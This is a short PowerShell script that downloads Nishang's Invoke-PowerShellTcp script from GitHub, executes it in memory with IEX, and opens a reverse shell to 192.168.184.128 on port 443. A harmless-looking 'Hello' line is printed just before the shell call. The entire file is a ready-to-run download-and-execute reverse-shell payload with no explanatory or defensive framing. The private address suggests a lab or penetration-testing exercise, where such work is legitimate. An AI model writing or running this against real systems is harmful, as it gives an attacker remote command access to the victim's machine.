function RunThis(){
    $wc = New-Object System.Net.Webclient
    IEX $wc.DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1")
    Invoke-PowerShellTcp -Reverse -IPAddress 192.168.184.128 -Port 443
}

Write-Host "Hello"
RunThis
